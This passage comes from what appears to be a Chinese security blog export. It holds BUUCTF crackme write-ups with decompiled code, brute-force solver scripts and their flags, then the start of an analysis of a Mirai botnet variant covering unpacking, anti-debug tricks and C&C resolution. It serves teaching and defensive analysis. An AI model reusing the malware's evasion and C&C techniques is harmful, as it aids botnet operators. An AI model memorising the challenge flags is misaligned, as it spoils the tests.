class="number">29</span>] != <span class="number">208422720</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9374400</span> * InputStr[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5759124</span> * InputStr[<span class="number">31</span>] == <span class="number">719890500</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>逻辑很简单，相除输出就行，但是缺少了第6位的数据，需要我们爆破<br>flag{e165421110ba03099a1c039337}</p>
<h2 id="buuctf-CrackRTF"><a href="#buuctf-CrackRTF" class="headerlink" title="buuctf-CrackRTF"></a>buuctf-CrackRTF</h2><p>首先，使用DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-CrackRTF-die.png"
                      alt="buuctf-CrackRTF-die"
                ><br>无壳，32位PE文件，C++编写，尝试运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/buuctf-CrackRTF_1.png"
                      alt="buuctf-CrackRTF_1"
                ><br>IDA Pro加载：<br>逻辑虽然说有些多，但是看起来并不困难：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD v3; <span class="comment">// eax</span></span><br><span class="line">  DWORD v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">260</span>]; <span class="comment">// [esp+4Ch] [ebp-310h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+150h] [ebp-20Ch]</span></span><br><span class="line">  <span class="type">char</span> String1[<span class="number">260</span>]; <span class="comment">// [esp+154h] [ebp-208h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">260</span>]; <span class="comment">// [esp+258h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Destination, <span class="number">0</span>, <span class="keyword">sizeof</span>(Destination));</span><br><span class="line">  <span class="built_in">memset</span>(String1, <span class="number">0</span>, <span class="keyword">sizeof</span>(String1));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pls input the first passwd(1): &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Destination);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Destination) != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Must be 6 characters!/images/n&quot;</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = atoi(Destination);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt; <span class="number">100000</span> )</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(Destination, <span class="string">&quot;@DBApp&quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Destination);</span><br><span class="line">  sub_40100A((BYTE *)Destination, v3, String1);</span><br><span class="line">  <span class="keyword">if</span> ( !_strcmpi(String1, <span class="string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;continue.../images/n/images/n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pls input the first passwd(2): &quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Must be 6 characters!/images/n&quot;</span>);</span><br><span class="line">      ExitProcess(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(Str, Destination);</span><br><span class="line">    <span class="built_in">memset</span>(String1, <span class="number">0</span>, <span class="keyword">sizeof</span>(String1));</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    sub_401019((BYTE *)Str, v4, String1);</span><br><span class="line">    <span class="keyword">if</span> ( !_strcmpi(<span class="string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span>, String1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)sub_40100F(Str) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error!!/images/n&quot;</span>);</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;bye ~~/images/n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到，程序首先要我们输入一个大于10000的数字，而且必须要是6位数，然后将其转化为int类型，然后拼接@DBApp，然后用<code>sub_40100A</code>函数，计算出String1，将计算出的String1与<code>6E32D0943418C2C33385BC35A1470250DD8923A9</code>对比，对比成功，继续输入，要求6位数组，然后要将第一步拼接完成的字符串拼接到第二次输入的int后面，然后使用<code>sub_401019</code>函数计算<code>String1</code>，然后与<code>27019e688a4e62a649fd99cadaafdb4e</code>对比，比对成功则使用<code>sub_40100F</code>函数再次验证，验证成功则显示<code>bye ~~</code>。<br>那我们就来看看<code>sub_40100A</code>函数，<code>sub_401019</code>函数和<code>sub_40100F</code>函数：<br>sub_40100A:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_40100A</span><span class="params">(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_401230(pbData, dwDataLen, lpString1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401230</span><span class="params">(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD i; <span class="comment">// [esp+4Ch] [ebp-28h]</span></span><br><span class="line">  CHAR String2[<span class="number">4</span>]; <span class="comment">// [esp+50h] [ebp-24h] BYREF</span></span><br><span class="line">  BYTE v6[<span class="number">20</span>]; <span class="comment">// [esp+54h] [ebp-20h] BYREF</span></span><br><span class="line">  DWORD pdwDataLen; <span class="comment">// [esp+68h] [ebp-Ch] BYREF</span></span><br><span class="line">  HCRYPTHASH phHash; <span class="comment">// [esp+6Ch] [ebp-8h] BYREF</span></span><br><span class="line">  HCRYPTPROV phProv; <span class="comment">// [esp+70h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !CryptAcquireContextA(&amp;phProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0xF0000000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CryptCreateHash(phProv, <span class="number">0x8004u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( CryptHashData(phHash, pbData, dwDataLen, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      CryptGetHashParam(phHash, <span class="number">2u</span>, v6, &amp;pdwDataLen, <span class="number">0</span>);</span><br><span class="line">      *lpString1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; pdwDataLen; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        wsprintfA(String2, <span class="string">&quot;%02X&quot;</span>, v6[i]);</span><br><span class="line">        lstrcatA(lpString1, String2);</span><br><span class="line">      &#125;</span><br><span class="line">      CryptDestroyHash(phHash);</span><br><span class="line">      CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CryptDestroyHash(phHash);</span><br><span class="line">      CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>如果不知道函数什么意思，查一下官方文档，这里就是对数组取了一个hash，那我们写一个脚本爆破一下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG2 <span class="string">&quot;@DBApp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_HASH <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sha1_hash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">char</span> output[SHA_DIGEST_LENGTH])</span> &#123;</span><br><span class="line">    SHA_CTX sha_ctx;</span><br><span class="line">    SHA1_Init(&amp;sha_ctx);</span><br><span class="line">    SHA1_Update(&amp;sha_ctx, input, <span class="built_in">strlen</span>(input));</span><br><span class="line">    SHA1_Final(output, &amp;sha_ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> hash[SHA_DIGEST_LENGTH];</span><br><span class="line">    <span class="type">char</span> hash_hex[SHA_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">100000</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 格式化字符串</span></span><br><span class="line">        <span class="built_in">snprintf</span>(input, <span class="keyword">sizeof</span>(input), <span class="string">&quot;%d%s&quot;</span>, i, FLAG2);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算 SHA-1 哈希</span></span><br><span class="line">        sha1_hash(input, hash);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换哈希为十六进制字符串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SHA_DIGEST_LENGTH; j++) &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;hash_hex[j * <span class="number">2</span>], <span class="string">&quot;%02x&quot;</span>, hash[j]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查哈希是否匹配目标值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(hash_hex, TARGET_HASH) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d%s/images/n&quot;</span>, i, FLAG2);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s/images/n&quot;</span>, hash_hex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>第二个加密函数与第一个类似，只是换成了md5计算hash，我们再来看看第二种比对方法：<br>sub_40100F函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_4014D0</span><span class="params">(LPCSTR lpString)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+50h] [ebp-1Ch]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+58h] [ebp-14h] BYREF</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+5Ch] [ebp-10h]</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+60h] [ebp-Ch]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+68h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  hResData = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hResInfo = FindResourceA(<span class="number">0</span>, (LPCSTR)<span class="number">0x65</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  hResData = LoadResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="keyword">if</span> ( !hResData )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lpBuffer = LockResource(hResData);</span><br><span class="line">  sub_401005(lpString, (<span class="type">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">  hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80u</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到该比对逻辑是：<br>使用AAA资源中的数据，生成dbapp.rtf文件，那我们看一看加密逻辑：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401420</span><span class="params">(LPCSTR lpString, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = lstrlenA(lpString);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们利用这个来逆向貌似更简单，rtf文件头：<code>/images/rtf1/images/</code>，我们只需要这6位，就能计算出第二次输入的值（异或），然后按照正常逻辑走，就能得到rtf文件，里面就有flag。<br>flag{N0_M0re_Free_Bugs}</p>
<h2 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="WUSTCTF2020-level2"></a>WUSTCTF2020-level2</h2><p>首先使用DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/WUSTCTF2020-level2-die.png"
                      alt="WUSTCTF2020-level2-die"
                ><br>UPX的壳，32位ELF文件，那我们用工具脱壳之后用IDA Pro加载：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">var_C= dword ptr -0Ch</span><br><span class="line">var_4= dword ptr -4</span><br><span class="line">argc= dword ptr  8</span><br><span class="line">argv= dword ptr  0Ch</span><br><span class="line">envp= dword ptr  10h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 14h</span><br><span class="line">mov     [ebp+var_C], offset flag ; &quot;wctf2020&#123;Just_upx_-d&#125;&quot;</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    offset aWhereIsIt ; &quot;where is it?&quot;</span><br><span class="line">call    puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 804887C</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure></div>
<p>flag就直接出来了：wctf2020{Just_upx_-d}，告诉我们就仅仅使用<code>upd -d</code>。</p>
<h2 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="MRCTF2020-Transform"></a>MRCTF2020-Transform</h2><p>首先，DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/MRCTF2020-Transform-die.png"
                      alt="MRCTF2020-Transform-die"
                ><br>64位PE文件，C语言编写，无壳。<br>尝试运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/MRCTF2020-Transform-1.png"
                      alt="MRCTF2020-Transform-1"
                ><br>IDA Pro加载：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str[<span class="number">104</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_402230(argc, argv, envp);</span><br><span class="line">  sub_40E640(<span class="string">&quot;Give me your code:/images/n&quot;</span>);</span><br><span class="line">  sub_40E5F0(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40E640(<span class="string">&quot;Wrong!/images/n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_414040[i] = Str[Arr_index[i]];</span><br><span class="line">    byte_414040[i] ^= LOBYTE(Arr_index[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_40F0E0[j] != byte_414040[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_40E640(<span class="string">&quot;Wrong!/images/n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_40E640(<span class="string">&quot;Right!Good Job!/images/n&quot;</span>);</span><br><span class="line">  sub_40E640(<span class="string">&quot;Here is your flag: %s/images/n&quot;</span>, Str);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>就是利用我们输入的字符串，以Arr_index&#x2F;images&#x2F;[i&#x2F;images&#x2F;]作为索引，进行异或操作，最终与byte_414040进行比较，那我们写出脚本：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">dword_40F040 = [<span class="number">0x9</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x17</span>, <span class="number">0x7</span>, <span class="number">0x18</span>, <span class="number">0x0C</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x3</span>, <span class="number">0x11</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x4</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x5</span>, <span class="number">0x1F</span>, <span class="number">0x8</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x0E</span>, <span class="number">0</span>]</span><br><span class="line">aGyURsywBFbLwya = [<span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x57</span>,<span class="number">0x5E</span>,<span class="number">0x5D</span>,<span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>,<span class="number">0x65</span>,<span class="number">0x3C</span>,<span class="number">0x5C</span>,<span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>]</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dword_40F040)):</span><br><span class="line">    aGyURsywBFbLwya[i] ^= dword_40F040[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dword_40F040)):</span><br><span class="line">    flag[dword_40F040[i]] = aGyURsywBFbLwya[i]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag]))</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>【样本分析】一个Mirai变种样本分析</title>
    <url>/2025/05/21/%E3%80%90%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E3%80%91%E4%B8%80%E4%B8%AAMirai%E5%8F%98%E7%A7%8D%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>在威胁狩猎系统捕获到一个新的样本，显示为Mirai的变种<br>样本经过UPX加壳，这里使用UPX官方工具进行脱壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250513094334.png"
                      alt="20250513094334"
                ></p>
<h2 id="文件静态信息："><a href="#文件静态信息：" class="headerlink" title="文件静态信息："></a>文件静态信息：</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250513094420.png"
                      alt="20250513094420"
                ><br>32位ELF应用程序，arm架构。<br>使用IDA Pro加载文件，发现没有去除符号表，这为我们的分析提供了很大的便利。</p>
<h1 id="初始化："><a href="#初始化：" class="headerlink" title="初始化："></a>初始化：</h1><h2 id="常规初始化"><a href="#常规初始化" class="headerlink" title="常规初始化"></a>常规初始化</h2><p>在样本执行功能之前，做了一系列初始化，以防止样本进程被终止：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521153336.png"
                      alt="20250521153336"
                ><br>首先就是将退出信号忽略，这么做的目的是为了防止样本进程意外退出，也是为了持久化。接下来，如果出现调试陷阱，将返回到<code>anti_gdb_entry</code>函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521180222.png"
                      alt="20250521180222"
                ><br>该函数只是将<code>resolve_func</code>指向了<code>resolve_cnc_addr</code>函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521180331.png"
                      alt="20250521180331"
                ><br>该函数将加密资源表中的第一项解密（一个域名），然后进行DNS，随机选择一个DNS返回到IP地址。<br>接下来，会对一些局部变量进行赋值：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521180558.png"
                      alt="20250521180558"
                ><br>这里的0x35CADE41应该是C&amp;C地址，但是这里不确定，还需后续验证。值得一提的是：其中的<code>util_local_addr</code>函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521180743.png"
                      alt="20250521180743"
                ><br>其实际上只是返回了一个DNS服务器地址：8.8.8.8，但是在分析过程中，有意外收获：</p>
<h2 id="反沙箱分析（学习）"><a href="#反沙箱分析（学习）" class="headerlink" title="反沙箱分析（学习）"></a>反沙箱分析（学习）</h2><h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><p>在静态分析过程中，发现了这一段代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">util_local_addr</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r5</span></span><br><span class="line">  _WORD v4[<span class="number">2</span>]; <span class="comment">// [sp+4h] [bp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+8h] [bp-20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+14h] [bp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">16</span>;</span><br><span class="line">  *(_DWORD *)_errno_location() = <span class="number">0</span>;</span><br><span class="line">  fd = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v2 = fd;</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0x8080808</span>;</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">13568</span>;</span><br><span class="line">  connect(fd, v4, <span class="number">16</span>);</span><br><span class="line">  getsockname(v2, v4, &amp;v6);</span><br><span class="line">  close(v2);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
